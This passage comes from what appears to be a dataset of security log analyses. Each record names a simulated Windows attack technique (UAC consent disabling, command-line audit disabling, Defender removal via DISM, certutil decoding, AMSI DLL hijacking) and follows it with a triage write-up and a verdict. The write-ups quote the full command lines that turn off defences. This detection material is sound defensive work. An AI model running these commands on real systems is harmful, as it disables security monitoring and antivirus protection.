4. **Sysmon Log Analysis:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` processes are recorded. Normally, this executable is related to routine update processes. However, the presence of temporary paths used for execution (`C:\\Program Files (x86)\\Microsoft\\Temp\\`) and frequent child process invocations could suggest an anomaly. The command lines are consistent with typical update services but must be further checked for consistency with known good behaviors.
   - There are several instances of `wevtutil.exe` and `conhost.exe` being executed by the `SERVER002\\admin_test` user, which can be related to legitimate administrative actions but may need further context.
   
5. **Windows PowerShell Log Analysis:**
   - The use of PowerShell script to create and manipulate directories within a user’s profile directory is observed. The command execution involves creating a directory, copying items, and then potentially cleaning them up (`Remove-Item`). This scripting sequence is slightly suspicious as it may suggest some form of data collection for further use. This is especially concerning if run by a non-usual context user or administrative account.

### Assessment:

- **Suspicious Activity**: The PowerShell commands suggest a potential data staging operation that could be precursor behavior for data exfiltration. The numerous processes involving `MicrosoftEdgeUpdate.exe` and temporary directories although potentially benign for update operations, layered with the PowerShell logs, push this into a suspicious domain requiring further investigation.
- **Risk**: There is a potential risk of data manipulation or exfiltration, especially if the involved user accounts or services were compromised or used unintentionally.

### Recommendation:

- **Further Investigation**: Conduct further analysis on the `PowerShell` command execution details, review user context and authorization for the `admin_test` user, and verify the integrity and source of updates to ensure they are legitimate.
- **Resolution**: Based on the observations, classify these activities as **SUSPICIOUS**. Immediate steps should be taken to monitor the system for any further anomalous behavior, involve the incident response team, and validate the origin and the necessity of the PowerShell scripts.

Ensure to check with internal policies and known system management tasks that could justify these logs."
Rundll32 execute command via FileProtocolHandler,"### Detailed Analysis of Logs:

#### Observations:

1. **System Log:**
   - There are several events indicating changes in system time. These kinds of events (Event ID 1 and 24) are typically generated when the system time is adjusted. This could be due to legitimate reasons such as time synchronization, but it can also be a tactic used by malicious actors to disrupt log timelines or evade detection.

2. **Security Log:**
   - Event ID 4616 indicates a system time change. These logs don't indicate any immediately obvious malicious activity but align with the observed time changes in the System log. The process involved is `svchost.exe`, which is a legitimate system process.

3. **Sysmon Log:**
   - Significant process creation activity with multiple instances of `wevtutil.exe`, `conhost.exe`, and `rundll32.exe`. 
   - A particular command of note is `rundll32.exe url.dll,FileProtocolHandler calc.exe`, which is used to launch the Calculator. While launching Calculator may seem benign, using `rundll32.exe` and `url.dll` in this way can be a method for executing arbitrary commands, especially if done without user interaction, hence potentially malicious.
   - Processes such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` were executed by the user `admin_test`. Execution of `wevtutil.exe` might imply log manipulation, which can be suspicious.

4. **Application Log:**
   - There's a record of the `edgeupdate` service stopping. Microsoft Edge Update is a legitimate service for updating the Edge browser, but sudden stoppage could indicate either service issues or interference by a threat actor.

#### Assessment:

The presence of `rundll32.exe` being used to execute `calc.exe` is suspicious. This method has been used historically as a means to evade straightforward detection when executing potentially harmful code.

The `wevtutil.exe` executions should be examined closely as this tool can be used to manipulate Windows Event Logs, potentially covering up nefarious activity by clearing or modifying logs.

The repeated service and time change logs indicate either a time synchronization issue or an anomaly intended to obscure actions within the system.

#### Risks and Threats Identified:

- **Potential Privilege Escalation**: If `wevtutil.exe` was used improperly, it might indicate an attempt to hide tracks by altering logs.
- **Command Execution**: The unusual use of `rundll32.exe` suggests potential misuse for executing commands, aligning with common tactics seen in script-based attacks or malware deployments.

#### Guidance on How to Proceed:

1. **Investigate Rundll32 Usage**: Confirm the legitimacy of the `rundll32.exe` execution. Check the context — was this done by the user, or could it be automated/scripted behavior?
   
2. **Check Log Manipulation Attempts**: Closely monitor for any further use of `wevtutil.exe` and verify the integrity and completeness of logs.

3. **Audit User Actions**: Review actions taken by the user `admin_test` to ensure these align with their legitimate activities. Consider additional monitoring for this user.

4. **System Time Changes**: Investigate the reason behind frequent time changes, checking NTP configurations if required.

Based on the above analysis and the suspicious behavior observed, particularly concerning the use of `rundll32.exe`, I would categorize this activity as:

**SUSPICIOUS**

This categorization warrants further investigation to confirm whether the suspicious activities are benign or indicative of a possible compromise."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"### Detailed Analysis of Logs

After a thorough review of the provided logs, I have identified several events of interest that may indicate suspicious or malicious activity. Here is a detailed analysis:

#### 1. **Application Log Analysis:**
- There are multiple events associated with `MsiInstaller`. Particularly:
  - **Event ID 1040 and 1042**: Installation process of a file located in a temporary directory executed. This includes `data.007_VBScript.msi`.
  - **Event ID 11707 and 1033**: These events indicate that the installation completed successfully.

#### 2. **Security Log Analysis:**
- **Event ID 4616**: Indicates a time change on the system. Time changes can be a sign of an attacker attempting to cover their tracks or manipulate logs.

#### 3. **System Log Analysis:**
- **Event ID 1 and 24**: These events from `Microsoft-Windows-Kernel-General` point towards system time adjustments, confirming potential tampering.

#### 4. **PowerShell Log Analysis:**
- Multiple `PowerShell` events show execution with the command `-nop -Command Write-Host VBScript executed me!; exit`. The use of PowerShell with `-nop` (no profile) may indicate an attempt to evade detection since a default profile could include scripts or configurations that may raise alerts or logs.

#### 5. **Sysmon Log Analysis:**
- **Process Execution Events**:
  - PowerShell and `cmd.exe` were executed with seemingly benign commands. However, `cmd.exe` executing the MSI package from a temporary directory (`data.007_VBScript.msi`) could indicate malicious intent, as temporary directories are common staging areas for attacks.
  - `whoami.exe` and `hostname.exe` being executed in short succession can be indicative of reconnaissance activity.
  - The installation through `msiexec.exe` using `/q` (quiet) can bypass user prompts, which is a common tactic in malicious activities to avoid user detection.

### Assessment of the Situation

- **Suspicious Behavior**: The installation of the MSI package from a temporary location, execution of PowerShell commands with `-nop`, and time adjustments stand out as suspicious activities pointing towards potential compromise.
- **Possible Compromise Indicators**: Execution of scripts and MSI installer packages from temporary directories with quiet install flags often point to malicious attempts to install unauthorized applications or backdoors.

### Resolution

The activity observed in the logs points towards the presence of unusual installations and potentially malicious PowerShell activity that requires further verification and possibly mitigative action. Therefore, the investigation concludes with the resolution:

- **SUSPICIOUS**: The logs contain activity suggesting possible compromise and require further investigation.

   - Isolate the affected machine (`Server002`) to prevent potential lateral movement or data exfiltration.
   - Review installed software and running services for unauthorized changes.

2. **Further Investigation**: 
   - Check the contents of `data.007_VBScript.msi` and other files in the temp directory for malicious scripts or executables.
   - Analyze the execution chain of processes around the time of detected suspicious activity.

3. **Follow-Up**:
   - Audit PowerShell scripts and command history for other unauthorized command executions.
   - Monitor network traffic for unusual or high-volume data transfers.
   - Engage with Incident Response to carry out a full forensic analysis if unauthorized or malicious activity is confirmed."
Disable ConsentPromptBehaviorAdmin via registry keys,"### Detailed Analysis:

#### Suspicious Activities:

1. **Multiple Executions of `wevtutil.exe` by `admin_test`:**
   - The `wevtutil.exe` is a legitimate Windows utility used to manage and query event logs. However, its repeated execution by `SERVER002\admin_test` without apparent cause could indicate event log clearing or malicious activity attempts to avoid detection.
   - Log Entries: EventRecordIDs such as `17978`, `17983`, `17987`, `17991`, and `17995`.

2. **Execution of `cmd.exe` with Registry Modification:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f` executed by `admin_test` is altering the UAC settings to `0` which suppresses all consent prompt dialog boxes, potentially for privilege escalation.
   - Log Entries: EventRecordID `18005`.

3. **Additional Execution of `reg.exe` Associated with UAC Bypass:**
   - The direct correlation with the `cmd.exe` execution and the changes made to UAC settings indicate the probability of a malicious attempt to maintain elevated privileges without user acknowledgment.
   - Log Entries: EventRecordID `18007`.

4. **Time Manipulation Events:**
   - Time adjustment events using `svchost.exe` observed in both the System and Security logs. Although this might happen due to legitimate reasons like synchronization with a time server, this can also be used to manipulate log timestamps.
   - Log Entries: EventRecordIDs `3569` (System Log) and `30349` (Security Log).

5. **Privileges Assigned (`4672` Events):**
   - The user `admin_test` has been assigned extensive privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be used for various malicious purposes, including process manipulation and unauthorized data access.
   - Log Entries: `30352`, `30354`.

#### Assessment of Situation:

The logs demonstrate suspicious behavior typically associated with attempts to escalate privileges and evade detection. These include:

- Multiple executions of utilities like `wevtutil.exe` which could be used to manipulate event logs.
- System registry changes to disable UAC prompts via command-line operations.
- Assigning high-level privileges following NTLM authentication, possibly used to conduct unauthorized actions.

#### Threats or Risks Identified:

- Potential unauthorized privilege escalation and system modifications.
- Concealment attempts by manipulating system and security logs.
- Unauthorized configuration change to bypass User Account Control policies, implying an attempt to mask malicious activity or establish continued unauthorized access.

#### Guidance on How to Proceed:

1. **Immediate Isolation of the Affected System:** To prevent further unauthorized activities, isolate the machine to stop any potential lateral movements within the network.

2. **Detailed Forensic Analysis:** Conduct deeper forensic analysis on the affected host to examine both the memory and storage for signs of additional compromises or tools.

3. **Reverse Engineering of Executed Commands:** Specifically, investigate the implications of registry edits and the purpose of each command executed by the `admin_test` user.

4. **Audit Privileged Account Activities:** Review the usage of high-privilege accounts across the network to identify other potentially compromised accounts.

5. **Implement Enhanced Monitoring:** Increase logging and monitoring for similar behavior patterns across other critical systems in the network.

### Final Resolution: **MALICIOUS**

The logs analyzed point to behavior consistent with malicious activities, particularly involving privilege escalation and actions designed to obfuscate signs of compromise. Immediate action is advised to mitigate potential ongoing threats and reinforce security measures."
Disable Windows Command Line Auditing using reg.exe,"Upon analyzing the provided Windows event logs, the following observations and findings can be made:

### Anomalous and Suspicious Activities:

1. **Registry Modification via cmd.exe:**
   - The command `cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f` was executed.
   - This modifies a registry key related to auditing of command line process creation, potentially disabling the inclusion of command line information in audit logs, which could be an attempt to hide malicious command executions.

2. **Frequent Use of Utilities and Scripting Tools:**
   - Processes such as `wevtutil.exe`, `cmd.exe`, and utilities like `C:\\Windows\\system32\\whoami.exe` and `C:\\Windows\\System32\\hostname.exe` were frequently launched by `admin_test`.
   - `wevtutil.exe` and `whoami.exe` are often used in information gathering, making their frequent launch suspicious.

3. **Process Execution Patterns:**
   - Repeated execution of system utilities within a short period could indicate a reconnaissance phase.
   - The pattern of executing processes like `MicrosoftEdgeUpdate.exe` appears to be regular updates; however, it's executed multiple times in various directories like ""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\"" and temporary directories. This is unusual and warrants further investigation to rule out tampered updates or malicious impersonation.

### Indicators of Malicious Activity:

- The registry modification command is a strong indicator of potentially malicious activities aiming to disable security logging.
- The unusual pattern of launching system utilities could be signs of a script or malware executing reconnaissance and persistence activities.

### Assessment of Situation:

Based on the indications:
- **Registry editing** to manipulate audit settings directly is a red flag, usually indicative of an attempt to cover tracks.
- The **pattern** of utility use and the manipulation of audit settings together suggest potentially malicious behavior.

### Identified Threats or Risks:

- Potential tampering or unauthorized access aiming to escalate privileges, evade detection, or conduct reconnaissance.
- Risk associated with possible script or malware execution which alters system configurations (e.g., registry changes).

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the machine for forensic analysis to limit any further potential impact.
   - Review user activity, especially that of `admin_test`, and investigate how this user executed these commands.
   - Examine the integrity and origin of the Microsoft Edge Update files to confirm legitimacy.

2. **Further Investigation:**
   - Check for any associated network connections or remote access at the time of these events.
   - Analyze other systems in proximity for similar signs of access or manipulation.

3. **Mitigation and Prevention:**
   - Re-enable any disabled auditing features and ensure robust monitoring is in place.
   - Consider further hardening of the Windows system and implementing more restrictive execution policies via GPO.

### Resolution:
Based on the evidence of registry modification to disable command line auditing and suspicious process usage patterns, the conclusion is:

- **MALICIOUS** - The logs contain activity that is strongly indicative of malicious intent, particularly targeting security controls to evade detection."
Msiexec.exe - Execute Local MSI file with embedded JScript,"Upon reviewing the provided Sysmon logs, a sequence of potentially suspicious activities is observed, highlighted by the execution of multiple processes under a user named `SERVER002\admin_test`. The following points stand out:

1. **Execution of PowerShell**: The Sysmon logs indicate the execution of PowerShell by the `admin_test` user (`EventID: 5`), without details on the command line used. While PowerShell is a legitimate tool, it also can be used for malicious purposes, particularly for operations that an attacker may wish to obfuscate within a system.

2. **Use of `wevtutil.exe`:** There are multiple instances of `wevtutil.exe` being invoked by the same admin user account. This tool is typically used for managing Windows event logs (e.g., clearing logs), which could suggest potential log manipulation or cover-up attempts.

3. **Execution of `cmd.exe` and `msiexec.exe`**: Another significant observation is the execution of `cmd.exe` with a command to run `msiexec.exe` using a payload located within a temporary path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi`). The use of MSIs from temporary paths in combination with silent switches (`/q`) can indicate the installation or execution of potentially malicious payloads.

4. **High Integrity Level**: Processes are executed with High Integrity Level, which typically indicates administrative privileges. This raises a red flag, as combining administrative privileges with potentially harmful commands may result in system-level modification.

5. **Execution of `HOSTNAME.EXE` and `whoami.exe`**: While these commands themselves aren't necessarily malicious, they can be used by attackers for system reconnaissance—`hostname` and `whoami` can be leveraged to ascertain the system environment and user context.

6. **Installation Logging**: The Application logs record the installation of the suspicious MSI mentioned in point 3, which supports the indication of possible installation of unwanted or malicious software.

Overall, these logs suggest potentially suspicious behavior involving the user `admin_test`. The notable events of concern are:
- The use of `cmd.exe` to silently execute an MSI from a temporary directory, potentially indicating an attempt to deploy unauthorized software.
- Multiple executions of `wevtutil.exe`, which could imply an attempt to alter or delete event logs.
- Execution of PowerShell potentially without clear purposes.

**Assessment: SUSPICIOUS**

**Recommended Actions:**
1. Further investigation is necessary to determine the legitimacy of the operations carried out by `admin_test`. 
2. Verify whether the MSI file is legitimate by inspecting its origin, creation metadata, and performing malware analysis if required.
3. Conduct a review of actions performed by the `admin_test` account to verify normal operation.
4. Analyze any associated network activity to check for any data exfiltration or contact with known malicious IP addresses.
5. If possible, revert any unexpected changes made by these processes and isolate the affected host for a deeper forensic analysis.

These steps will help ascertain whether these actions were part of a benign process or indicative of a larger security threat."
Phantom Dll Hijacking - WinAppXRT.dll,"Based on the logs provided:

1. **Microsoft Edge Update Activity:**
   - Multiple instances of ""MicrosoftEdgeUpdate.exe"" are present, which aligns with the typical behavior of the Microsoft Edge Update service. It is common for update processes to run under the ""NT AUTHORITY\\SYSTEM"" user account since updates typically require system privileges. The processes are executed with some command-line arguments like ""/ua /installsource core"" which are normal for an update operation.
   - There is an event where ""MicrosoftEdgeUpdate.exe"" is launched from a temporary directory (""C:\\Program Files (x86)\\Microsoft\\Temp\\EU62B7.tmp\\MicrosoftEdgeUpdate.exe""). While executing updater components from a temporary directory could be considered uncommon, Microsoft updates can sometimes involve intermediate steps that use temporary files.

2. **System Utilities Execution:**
   - There are logs indicating the execution of system utilities like ""whoami.exe"", ""wevtutil.exe"", ""cmd.exe"", and ""reg.exe"". The execution of these utilities can sometimes be legitimate but can also indicate attempts to gather information or modify the system configuration maliciously.
   - The key alarming activity is seen in the execution of ""cmd.exe"" with a command string that involves copying ""amsi.dll"" to a different location, renaming it to ""WinAppXRT.dll"", and modifying the registry. This is a clear indicator of an attempt to disable or bypass the Antimalware Scan Interface (AMSI), a common tactic used by malware to evade detection by security software. 

3. **Command-Line Activity:**
   - The command executed by ""cmd.exe"" aims to replace the AMSI DLL and set a registry key value, suggesting that it is likely attempting to interfere with the security settings or bypass mechanisms that may hinder malicious behavior. This command is highly suspicious and indicative of malicious intent.

**Assessment:**
- The execution of ""cmd.exe"" with commands targeting AMSI is a strong sign of malicious activity. Attempts to bypass AMSI are commonly associated with malware trying to evade detection.
- Other system activities such as ""MicrosoftEdgeUpdate.exe"" execution and system utility calls may not inherently be malicious but, in context with the AMSI bypass, they warrant further scrutiny.

**Resolution:**
- **MALICIOUS:** The presence and use of specific command-line arguments targeting AMSI, coupled with registry modifications, clearly indicate an attempt to compromise system security. Immediate actions should be taken to investigate this further and prevent potential damage, including isolating the system from the network, examining temporary directories and registry values, and reviewing other systems for similar indicators. Additionally, contacting your incident response team or security operations center (SOC) should be considered to assess the scope of the breach and remediate."
Disable .NET Event Tracing for Windows Via Registry (cmd),"## Detailed Log Analysis

Upon reviewing the provided Windows Sysmon logs, several key findings and observations have been noted. I will break down noteworthy elements from the logs and provide a final assessment.

### Key Observations

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. These processes are closely timed and are atypical unless being used for specific event log queries or manipulations. `wevtutil.exe` is a legitimate tool but can be utilized for malicious purposes like clearing event logs.
   
2. **Registry Modification via `cmd.exe`**:
   - A command `cmd.exe /c REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0` is logged. This modifies a registry setting related to .NET Framework Event Tracing for Windows. This type of modification can potentially be used to disable certain types of logging or monitoring.
   
3. **Execution of Common Windows Utilities (`hostname.exe`, `whoami.exe`)**:
   - Executions of `hostname.exe` and `whoami.exe` are recorded. These tools are typically benign and used for system reconnaissance. However, in the context of other suspicious activity, they could be part of a script or process checking environment details.
   
4. **Edge Update and Related Executables**:
   - There are multiple instances of Microsoft Edge Updater (`MicrosoftEdgeUpdate.exe`) and related binaries executing. These processes are primarily executed by `NT AUTHORITY\SYSTEM`, which is expected for system processes. No anomalies are observed in this behavior indicating a routine update mechanism for Microsoft Edge.

### Assessment of Potential Malicious Activity

Given the following:
- The combination of `wevtutil.exe` executions with `reg.exe` registry modifications under the context of a non-standard admin user (`SERVER002\admin_test`).
- The use of the high-integrity `cmd.exe` to alter registry settings which might alter logging/monitoring behavior.
- Frequent executions taking place at very close intervals without sufficient context or normal justifications (e.g., scripted systematic reconnaissance or maintenance).

These patterns suggest that there are indicators of potentially malicious activity. While some executed binaries are legitimate operands (e.g., system updates), the registry modifications especially indicate potential attempts to obfuscate or alter system monitoring, a common tactic in persistent attacks.

### Recommended Action

**Classification**: SUSPICIOUS

**Guidance**:
- **Immediate Investigation**: Perform a deeper investigation of `SERVER002\admin_test` activities, including user login logs and associated commands executed during this session.
- **Host Isolation**: Consider isolating the host to prevent potential spread if further malicious intent is uncovered.
- **Review Scripts/Automations**: Check for any unauthorized scripts or scheduled tasks on Server002 that might have led to the observed behavior.
- **Audit Event Logs**: Verify the event logs for possible alteration (e.g., cleared log entries). Restore logs if necessary from a reliable backup.
- **Security Enhancements**: Implement additional monitoring and alerting for suspicious use of system utilities such as `wevtutil.exe` and registry modifications.

### Conclusion

The activity captured in the logs warrants classified as suspicious due to behavioral indicators that suggest anomalies inconsistent with typical system administration tasks. Further investigation and monitoring are essential to ensure system security and integrity."

InstallHelper method call,"Upon analyzing the provided logs from different sources, several indicators suggest potential malicious activity or at least activities warranting further investigation. Here is a detailed analysis of the events parsed from the logs:

1. **PowerShell Activity:** The logs indicate the execution of a PowerShell script that involves using `Invoke-BuildAndInvokeInstallUtilAssembly`, targeting an installation assembly through a PowerShell script located in the temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`). It attempts to compile or manipulate assemblies through commands such as `Add-Type`, targeting `System.Configuration.Install`. This behavior is highly suspicious because attackers often leverage PowerShell for its powerful scripting capabilities to execute malicious code, especially when compiled in an obfuscated or temporary manner.

2. **Processes Executed by Admin User:** The logs show several suspicious processes executed by `SERVER002\admin_test`, such as `wevtutil.exe`, `conhost.exe`, `powersehell.exe`, and various .NET Framework tools. In particular, the use of `wevtutil.exe` for potentially managing event logs and `csc.exe` for compiling C# code from .NET are indicators of potential attempts to manipulate system configurations or compile custom code which could be malicious.

3. **EdgeUpdate Activities:** There are several instances where `MicrosoftEdgeUpdate.exe` is involved in system operations. While updating processes can be benign, frequent, and complex executions of update processes without clear updates being performed could suggest misuse of a legitimate process for malicious purposes.

4. **High Integrity Level:** The processes executed tend to run at a high integrity level, which means they have elevated privileges. This is commonly observed in privilege escalation scenarios often leveraged by attackers to maintain persistence and control.

**Recommendation and Conclusion:**

Given the above activities, particularly the PowerShell script execution with potentially malicious intent and suspicious use of administrative privileges, the logs suggest activity that is beyond normal operational procedures. However, while the activities are highly suspect and warrant further investigation, there may not yet be enough information to definitively label these activities as completely malicious due to the lack of direct evidence of payload deployment or data exfiltration.

As a result, the assessment will be marked as **SUSPICIOUS**, indicating that the logs contain activities that do not look right and need more investigation. We must investigate further by:

- Reviewing additional logs for file system changes or network traffic associated with these process executions.
- Identifying the source of scripts and executables executed to determine their legitimacy.
- Examining if the tools like `InstallUtil` and `csc.exe` might have been used to create or install unauthorized applications.
- Monitoring the usage of potentially exploited user accounts (`admin_test`) for abnormal patterns.

Immediate containment actions, including isolating the affected machine and analyzing the processes in a controlled environment, should be considered to prevent potential threats from escalating."
BlackByte Ransomware Registry Changes - Powershell,"### Analysis of Windows Event Logs:

#### Overview:

1. **Processes & Commands:**
    - Frequent execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by user `SERVER002\admin_test`.
    - Execution of `wevtutil.exe` might be normal for administrative actions involving event logs, but scheduled and rapid consecutive executions could indicate scripted or automated logging operations.
    - `conhost.exe` is a normal utility for command-line interfaces on Windows, but its frequent invocation alongside `wevtutil.exe` should be reviewed for automation tools.

2. **PowerShell Activity:**
    - The following PowerShell command was executed: 
      ```
      New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
      New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
      New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem\"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
      ```
    - This command modifies registry entries to enable administrative connections over network and long paths in files. While this can be used for legitimate administrative configurations, without context or change management records, this can be deemed suspicious of preparing the system for unauthorized remote access or data exfiltration.

3. **Unexpected Time Change:**
    - Time was adjusted in a short interval, as noted in both Security and System logs related to `svchost.exe`. This behavior can be typical for time synchronization purposes, but the presence should be confirmed against expected operations or logs from time management services.

#### Assessment:

- **Suspicious Behavior:**
  - The execution of registry manipulation via PowerShell without documented change management might suggest unauthorized system configuration changes.
  - High-frequency `wevtutil.exe` & `conhost.exe` activity could be part of a script potentially designed to manipulate or extract system logs in an unauthorized manner.
  
- **Potential Risks:**
  - Elevated risk of malicious backdoor establishment or prep for lateral movement within the network due to modification of critical system registry paths.
  - Possible malicious scripting aimed towards log manipulation or collection of sensitive data.

#### Guidance:

1. **Investigate & Contain:**
   - Review `SERVER002\admin_test`'s access scope, logon records, and recent activities for any anomalies or unauthorized accesses.
   - Correlate with network and endpoint monitoring tools to identify if this activity is spread across other systems.
   - Validate if the registry changes via PowerShell were part of approved administrative tasks.

2. **Secure & Remediate:**
   - Implement enhanced logging and monitoring on PowerShell, Process Creation, and Registry edits.
   - Conduct user and access reviews, particularly focusing on privileged accounts.
   - Consider isolating the host until a complete security assessment is performed.

3. **Further Investigation:**
   - Conduct forensic analysis to determine the presence and extent of any unauthorized data modifications or exfiltration.
   - Ensure appropriate patches and security configurations are enforced across the network to prevent exploitation.

### Resolution: **SUSPICIOUS**

Disable Windows Defender with DISM,"### Detailed Analysis

#### Suspicious or Anomalous Behavior Identified:
1. **DISM Execution**: The logs show that `cmd.exe` was executed with command-line arguments to disable Windows Defender using DISM:
    - Command: `""cmd.exe"" /c Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
    - This command directly disables and removes Windows Defender, which is suspicious unless explicitly performed by a legitimate admin action for maintenance or a known process.

2. **Time Manipulation**: There are multiple entries indicating that the system time was changed:
    - EventID 4616 from Security Logs indicates time changes with `ProcessName` pointing to `svchost.exe`.

3. **Privilege Escalation**:
    - The account `SERVER002\\admin_test` initiates several processes and has obtained high privileges including `SeDebugPrivilege`, which is often associated with processes that require deep system access and could be prone to misuse for unauthorized privilege escalation.
    - Logon events (EventID 4624 and 4672) show a logon session with elevated privileges.

4. **Unusual Execution of System Utilities**:
    - Frequent execution of `wevtutil.exe` and `conhost.exe`, which are not usually found in rapid successive execution unless script-driven or automated.
    - Use of `hostname.exe` and `whoami.exe` suggests gathering environmental information, commonly seen in reconnaissance phases.

#### Indicators of Malicious Activity:
- **DISM Usage**: The disabling of Windows Defender via the command line presents a strong indicator of compromise. Malicious entities often disable security tools to avoid detection.
- **Time Changes**: Alterations in system time could be used to mask the timing of events, important for forensic investigations. This could indicate an attempt to interfere with logs and timestamps.
- **Repeated Use of Administrative Utilities**: Execution patterns of `wevtutil.exe` and `conhost.exe` suggest possible automation or script exploitation. While utilities themselves are not malicious, usage patterns in conjunction with other suspicious activities raise concerns.

### Assessment
Given the combination of disabling Windows Defender, system time changes, and the use of administrative privileges, these logs suggest that there is malicious activity involved. The actions taken (disabling security features and manipulating system time) strongly indicate an intent to compromise the machine covertly.

### Recommendation and Resolution

Certutil Rename and Decode,"After analyzing the provided Windows event logs for unusual behavior, my assessment of the situation is as follows:

### Suspicious or Anomalous Behavior

Here are the key observations from the logs:

1. **Cmd.exe Execution with CertUtil Usage**: 
    - There is a Sysmon event showing the execution of `cmd.exe` with a command that copies `certutil.exe` to a temporary directory and then uses it to encode and decode a file (concatenating `calc.exe`).
    - Command: `""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\data_calc2.txt & %temp%\tcm.tmp -decode %temp%\data_calc2.txt %temp%\data_calc2_decoded.exe`
    - The use of `certutil` to encode and decode files is a known technique used in attacks for file obfuscation or data exfiltration.

2. **Unusual Processes and Privileges**:
   - EventID 4672 indicates that the `SYSTEM` user was granted a series of high privileges, such as `SeDebugPrivilege`, which can be suspicious if not usual for the environment.
   - Multiple processes like `wevtutil.exe`, `conhost.exe`, and `hostname.exe` were executed by the `admin_test` user in rapid succession. Although these may be standard, the pattern and frequency in this context could suggest script-like automated activity.

3. **Repeated Use of Administrative User**:
   - The same administrative user (`SERVER002\admin_test`) is noted executing several system utility processes, which could be indicative of either legitimate administrative script executions or malicious activity.

### Assessment of Malicious Activity

While some activities involve the execution of common system utilities (e.g., `wevtutil.exe`, `cmd.exe`), the specific way `certutil.exe` is being used is highly suspicious. The commands indicate an attempt to manipulate or inspect system binaries in a way that is often associated with malicious intent. In scenarios where `certutil` is used to encode/decode files, it leads to a high suspicion of an attempt to obfuscate malicious activities or perform unauthorized data manipulation.

### Conclusion

Based on the log analysis, there is strong evidence of suspicious activity, especially considering the inappropriate use of `certutil.exe` and the execution pattern involving high-privilege commands and processes. However, without more context on the environment, it is not absolutely conclusive for a definitive 'malicious' tag.

**Resolution: SUSPICIOUS**

### Recommendations

1. **Further Investigation Required**:
    - Investigate the origin and intent of the `admin_test` user’s activities.
    - Verify if there are any legitimate scripts or scheduled tasks that justify these commands.
    - Check for any recent system failures, alerts, or other entries that explain this pattern.

2. **Immediate Actions**:
    - Conduct a review of administrative account usage.
    - Examine the integrity of system binaries, particularly `certutil.exe`, to determine if the binary has been manipulated.
    
3. **Broader Security Measures**:
    - Enhance monitoring for usage patterns of administrative tools like `certutil.exe`.
    - Review and possibly tighten user permissions related to process creation and privilege elevation.

This assessment and recommendation will provide guidance for deeper investigation to ascertain if there is indeed a compromise or if the activities have a legitimate purpose."
Windows Powershell Logging Disabled,"### Analysis of the Logs

Upon reviewing the provided Sysmon, Application, Windows PowerShell, Security, and System logs, several key observations can be made:

#### Sysmon Log Analysis

1. **Process Activity**:
   - A sequence of processes involving `wevtutil.exe` and `cmd.exe` were observed executing with high integrity under the user `SERVER002\admin_test`. Notably, `wevtutil.exe` was used to export logs, which might be a legitimate operation but could also indicate an attempt to cover tracks.
   - The execution of `cmd.exe` involves registry modifications to disable PowerShell logging, including Module, ScriptBlock, and Transcription logging. This is suspicious as it indicates an attempt to reduce visibility and auditing, often a technique used by attackers to evade detection.

2. **Use of `conhost.exe`**:
   - Frequent spawns of `conhost.exe`, typically used with `cmd.exe` and other console applications, aligned with the other commands. While not unusual on its own, its consistent presence alongside suspicious `cmd.exe` commands warrants attention.

3. **Microsoft Edge Update Activity**:
   - A series of events related to Microsoft Edge updates were logged. Although running `MicrosoftEdgeUpdate.exe` and its components at the system level is a normal part of automatic updates, the installation process involved a temporary directory. This stands out as unusual as temporary directories are less common for production update activities. However, this could still be normal software behavior if confirmed by system policy.

#### Application Log Analysis

- The only logs pertain to the stopping of the Edge update service, which aligns with the Sysmon log entries indicating Edge-related activities. These on their own are not inherently suspicious.

#### Security Log Analysis

- The security logs noted changes in system time involving the `svchost.exe` process, likely part of routine network time protocol (NTP) services. Given their context, these do not present as suspicious for malicious activity.

#### System Log Analysis

- Kernel general logs and time service events corroborate time adjustments found in the security logs. The logs suggest actions that appear typical for time synchronization purposes.

### Assessment and Resolution

Considering all the elements:

1. **Suspicious Activity**:
   - The disabling of PowerShell logging via registry modifications is a notable concern as this is often associated with attempts to hide subsequent malicious PowerShell operations or activities.

2. **Edge Update Activities**: 
   - While unusual paths and use of temporary directories might seem suspicious, context regarding corporate policy on updates or software distribution could explain this behavior.

In conclusion, based on the evidence, the activity of disabling PowerShell auditing is enough to classify these logs under the following resolution:

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Inquiry**: Investigate the reason behind the PowerShell logging configuration changes, focusing on identifying the responsible party and the justification for such actions.

DLL Search Order Hijacking - amsi.dll,"Upon reviewing the provided Windows event logs, the following points of interest and potential indicators of malicious activity have been identified:

1. **PowerShell Execution**: 
   - A PowerShell session was initiated by a process called `updater.exe` located in `C:\Users\admin_test\AppData\Roaming`.
   - The command line used for PowerShell execution: `updater.exe -Command exit`, while simplistic, indicates that the PowerShell session was deliberately started and stopped immediately. This could suggest process masquerading or an attempt to use PowerShell in a potentially covert manner.

2. **Command Prompt and Script Execution**:
